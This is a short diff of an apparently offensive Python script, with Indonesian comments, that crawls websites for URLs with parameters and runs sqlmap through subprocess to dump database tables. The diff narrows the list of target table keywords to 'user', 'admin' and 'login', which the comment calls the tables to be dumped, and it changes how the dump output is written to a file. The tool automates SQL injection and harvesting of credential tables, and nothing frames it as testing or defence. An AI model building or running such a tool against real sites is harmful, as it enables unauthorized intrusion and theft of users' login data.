@@ -10,7 +10,7 @@ import os
 CRAWL_LIMIT = 100
 MAX_THREADS = 10
 SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
-TARGET_KEYWORDS = ["user", "username", "admin", "pass", "password", "login"]
+TARGET_KEYWORDS = ["user", "admin", "login"]  # Tabel yang akan didump
 
 VISITED = set()
 URLS_WITH_PARAMS = []
@@ -80,7 +80,6 @@ def run_targeted_dump(url):
                     ]
                     dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
                     print(dump_result.stdout)
-                    f.write(f"\n=== {db}.{table} ===\n")
                     f.write(dump_result.stdout + "\n")
 
 if __name__ == "__main__":
